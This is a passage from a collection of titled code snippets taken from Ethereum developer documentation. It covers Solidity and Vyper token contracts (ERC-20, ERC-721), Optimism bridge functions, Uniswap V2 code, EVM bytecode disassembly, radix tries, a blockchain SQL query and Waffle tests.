token where withdrawal is initiated.\n     * @param _from Account to pull the withdrawal from on L2.\n     * @param _to Account to give the withdrawal to on L1.\n     * @param _amount Amount of the token to withdraw.\n     * @param _l1Gas Unused, but included for potential forward compatibility considerations.\n     * @param _data Optional data to forward to L1. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function _initiateWithdrawal(\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) internal {\n        // When a withdrawal is initiated, we burn the withdrawer's funds to prevent subsequent L2\n        // usage\n        // slither-disable-next-line reentrancy-events\n        IL2StandardERC20(_l2Token).burn(msg.sender, _amount);\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Token Recovery Function\nDESCRIPTION: An administrative function that allows the contract owner to recover ERC-20 tokens that were mistakenly sent to the contract. It transfers the entire balance of a specific token to a destination address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction cleanupERC20(\n    address erc20,\n    address dest\n)\n    public\n    onlyOwner\n{\n    IERC20 token = IERC20(erc20);\n    uint balance = token.balanceOf(address(this));\n    token.transfer(dest, balance);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementando a Função de Compra de Tokens em uma DEX Solidity\nDESCRIPTION: Implementação da função buy() que permite aos usuários enviar ETH e receber tokens ERC-20 em troca. A função verifica se há tokens suficientes disponíveis na reserva do contrato.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction buy() payable public {\n    uint256 amountTobuy = msg.value;\n    uint256 dexBalance = token.balanceOf(address(this));\n    require(amountTobuy > 0, \"You need to send some ether\");\n    require(amountTobuy <= dexBalance, \"Not enough tokens in the reserve\");\n    token.transfer(msg.sender, amountTobuy);\n    emit Bought(amountTobuy);\n}\n```\n\n----------------------------------------\n\nTITLE: CALLCODE Operation Memory Effect in Ethereum VM\nDESCRIPTION: The CALLCODE opcode (0xF2) is similar to DELEGATECALL but handles msg.sender and msg.value differently. It places return data in the specified memory location.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] = returndata\n```\n\n----------------------------------------\n\nTITLE: Example Smart Contract for Manticore Analysis\nDESCRIPTION: A complete Solidity smart contract example that will be analyzed using Manticore. The contract contains a function that reverts when a specific value is provided as input.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.24 <0.6.0;\n\ncontract Simple {\n    function f(uint a) payable public{\n        if (a == 65) {\n            revert();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Update and Delete Operations in Radix Tries\nDESCRIPTION: Demonstrates how update and delete operations are implemented in a radix trie. The update function recursively traverses the trie to insert a value, while delete removes values and prunes empty branches. Both functions maintain the Merkle property by rehashing nodes.\n\nLANGUAGE: python\nCODE:\n```\n    def update(node_hash, path, value):\n        curnode = db.get(node_hash) if node_hash else [ NULL ] * 17\n        newnode = curnode.copy()\n        if path == '':\n            newnode[-1] = value\n        else:\n            newindex = update(curnode[path[0]], path[1:], value)\n            newnode[path[0]] = newindex\n        db.put(hash(newnode), newnode)\n        return hash(newnode)\n\n    def delete(node_hash, path):\n        if node_hash is NULL:\n            return NULL\n        else:\n            curnode = db.get(node_hash)\n            newnode = curnode.copy()\n            if path == '':\n                newnode[-1] = NULL\n            else:\n                newindex = delete(curnode[path[0]], path[1:])\n                newnode[path[0]] = newindex\n\n            if all(x is NULL for x in newnode):\n                return NULL\n            else:\n                db.put(hash(newnode), newnode)\n                return hash(newnode)\n```\n\n----------------------------------------\n\nTITLE: Loading Contract ABI for Interaction in JavaScript\nDESCRIPTION: Code to import the contract's ABI (Application Binary Interface) from the artifacts generated by Hardhat.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n```\n\n----------------------------------------\n\nTITLE: Validating ERC-721 Receiver Interface Compliance\nDESCRIPTION: This assertion verifies that the recipient contract properly implements the ERC721Receiver interface by checking the return value of onERC721Received matches the expected function selector.\n\nLANGUAGE: vyper\nCODE:\n```\n        # Throws if transfer destination is a contract which does not implement 'onERC721Received'\n        assert returnValue == method_id(\"onERC721Received(address,address,uint256,bytes)\", output_type=bytes32)\n```\n\n----------------------------------------\n\nTITLE: Implementing isApprovedForAll View Function for ERC-721\nDESCRIPTION: Checks if an address is an approved operator for another address. This is part of the ERC-721 operator approval mechanism, allowing addresses to manage all tokens of another address.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef isApprovedForAll(_owner: address, _operator: address) -> bool:\n    \"\"\"\n    @dev Checks if `_operator` is an approved operator for `_owner`.\n    @param _owner The address that owns the NFTs.\n    @param _operator The address that acts on behalf of the owner.\n    \"\"\"\n    return (self.ownerToOperators[_owner])[_operator]\n```\n\n----------------------------------------\n\nTITLE: Defining Pair Tracking State Variables in Uniswap V2 Factory\nDESCRIPTION: Declaration of state variables that track exchange pairs. The getPair mapping identifies a pair exchange contract by the two ERC-20 token addresses, while allPairs array stores all pair exchange addresses created by this factory.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping(address => mapping(address => address)) public getPair;\n    address[] public allPairs;\n```\n\n----------------------------------------\n\nTITLE: UniswapV2Library Contract Definition\nDESCRIPTION: Defines a Solidity library for Uniswap V2 periphery contracts, providing token sorting functionality to ensure consistent ordering of token pairs. Includes basic initialization and the sortTokens function.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.5.0;\n\nimport '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';\n\nimport \"./SafeMath.sol\";\n\nlibrary UniswapV2Library {\n    using SafeMath for uint;\n\n    // returns sorted token addresses, used to handle return values from pairs sorted in this order\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n    }\n```\n\n----------------------------------------\n\nTITLE: Calldata Size Validation in Function 0x81e580d3\nDESCRIPTION: This bytecode segment validates that the calldata has at least 32 bytes (one word) after the function signature. If the validation fails, the function reverts.\n\nLANGUAGE: evm\nCODE:\n```\n18F | JUMPDEST            | 0x04 CALLDATASIZE 0x0153 0xDA                                |\n190 | PUSH1 0x00          | 0x00 0x04 CALLDATASIZE 0x0153 0xDA                           |\n192 | PUSH1 0x20          | 0x20 0x00 0x04 CALLDATASIZE 0x0153 0xDA                      |\n194 | DUP3                | 0x04 0x20 0x00 0x04 CALLDATASIZE 0x0153 0xDA                 |\n195 | DUP5                | CALLDATASIZE 0x04 0x20 0x00 0x04 CALLDATASIZE 0x0153 0xDA    |\n196 | SUB                 | CALLDATASIZE-4 0x20 0x00 0x04 CALLDATASIZE 0x0153 0xDA       |\n197 | SLT                 | CALLDATASIZE-4\\<32 0x00 0x04 CALLDATASIZE 0x0153 0xDA         |\n198 | ISZERO              | CALLDATASIZE-4>=32 0x00 0x04 CALLDATASIZE 0x0153 0xDA        |\n199 | PUSH2 0x01a0        | 0x01A0 CALLDATASIZE-4>=32 0x00 0x04 CALLDATASIZE 0x0153 0xDA |\n19C | JUMPI               | 0x00 0x04 CALLDATASIZE 0x0153 0xDA                           |\n```\n\n----------------------------------------\n\nTITLE: Token Transfer and Approval Operations in EVM Bytecode\nDESCRIPTION: This EVM bytecode implements core ERC-20 token functionality including transfers, approvals, and balance checks. The code uses the standard ERC-20 storage layout with mappings for balances and allowances, and includes proper validation for zero addresses and sufficient balances.\n\nLANGUAGE: evm\nCODE:\n```\nDD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 P\n```\n\n----------------------------------------\n\nTITLE: Implementing Internal clearApproval Helper for ERC-721 in Vyper\nDESCRIPTION: Internal function that clears the approval for a token, optimizing gas usage by only writing to storage when necessary.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _clearApproval(_owner: address, _tokenId: uint256):\n    \"\"\"\n    @dev Clear an approval of a given address\n         Throws if `_owner` is not the current owner.\n    \"\"\"\n    # Throws if `_owner` is not the current owner\n    assert self.idToOwner[_tokenId] == _owner\n    if self.idToApprovals[_tokenId] != ZERO_ADDRESS:\n        # Reset approvals\n        self.idToApprovals[_tokenId] = ZERO_ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Authorization Check for Token Approval\nDESCRIPTION: This code verifies that the caller is either the token owner or an approved operator before allowing token approval changes. This ensures only authorized parties can set approval for a token.\n\nLANGUAGE: python\nCODE:\n```\n# Check requirements\nsenderIsOwner: bool = self.idToOwner[_tokenId] == msg.sender\nsenderIsApprovedForAll: bool = (self.ownerToOperators[owner])[msg.sender]\nassert (senderIsOwner or senderIsApprovedForAll)\n\n# Set the approval\nself.idToApprovals[_tokenId] = _approved\nlog Approval(owner, _approved, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Implementing safeTransferFrom Method for ERC-721 in Vyper\nDESCRIPTION: Safely transfers NFT ownership by checking if the recipient is a contract and verifying it can receive ERC-721 tokens. Calls onERC721Received on contract recipients to confirm proper token handling capability.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef safeTransferFrom(\n        _from: address,\n        _to: address,\n        _tokenId: uint256,\n        _data: Bytes[1024]=b\"\"\n    ):\n    \"\"\"\n    @dev Transfers the ownership of an NFT from one address to another address.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the\n         approved address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n         If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n         the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`. \n         NOTE: bytes4 is represented by bytes32 with padding\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    @param _data Additional data with no specified format, sent in call to `_to`.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Extracting Detailed Ethereum Transaction Information with SQL\nDESCRIPTION: This query retrieves detailed transaction information from the Ethereum blockchain for the Ethereum Foundation's address, including recipient, sender, ETH amount, transaction data, gas metrics, and percentage of gas limit used.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    \"to\",\n    \"from\",\n    value / 1e18 AS ether,\n    data,\n    gas_limit,\n    gas_price / 1e9 AS gas_price_gwei,\n    gas_used,\n    ROUND(((gas_used / gas_limit) * 100),2) AS gas_used_pct\nFROM ethereum.\"transactions\"\nWHERE \"to\" = '\\xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe'\nORDER BY block_time DESC\n```\n\n----------------------------------------\n\nTITLE: ERC20 Deposit Wrapper Functions in Solidity\nDESCRIPTION: External functions that provide interfaces for depositing ERC20 tokens to L2. The first function deposits to the sender's own address on L2, while the second allows specifying a different recipient on L2.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @inheritdoc IL1ERC20Bridge\n */\nfunction depositERC20(\n    .\n    .\n    .\n) external virtual onlyEOA {\n    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, msg.sender, _amount, _l2Gas, _data);\n}\n\n/**\n * @inheritdoc IL1ERC20Bridge\n */\nfunction depositERC20To(\n    .\n    .\n    .\n) external virtual {\n    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, _to, _amount, _l2Gas, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing balanceOf Function for ERC-721 in Vyper\nDESCRIPTION: View function that returns the number of NFTs owned by a specific address, throwing an error if the address is zero.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef balanceOf(_owner: address) -> uint256:\n    \"\"\"\n    @dev Returns the number of NFTs owned by `_owner`.\n         Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\n    @param _owner Address for whom to query the balance.\n    \"\"\"\n    assert _owner != ZERO_ADDRESS\n    return self.ownerToNFTokenCount[_owner]\n```\n\n----------------------------------------\n\nTITLE: Testing Contract Function Calls with Waffle Matchers\nDESCRIPTION: Using Waffle's calledOnContract matcher to verify that the contract calls specific functions on its dependencies.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"checks if contract called balanceOf on the ERC20 token\", async () => {\n  await mockERC20.mock.balanceOf.returns(utils.parseEther(\"999999\"))\n  await contract.check()\n  expect(\"balanceOf\").to.be.calledOnContract(mockERC20)\n})\n```\n\n----------------------------------------\n\nTITLE: UI Helper Functions for ERC20 Token\nDESCRIPTION: These functions provide token metadata (name, symbol, and decimals) to user interfaces. They have view visibility as they don't modify state and return data from memory storage.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view returns (string memory) {\n        return _symbol;\n  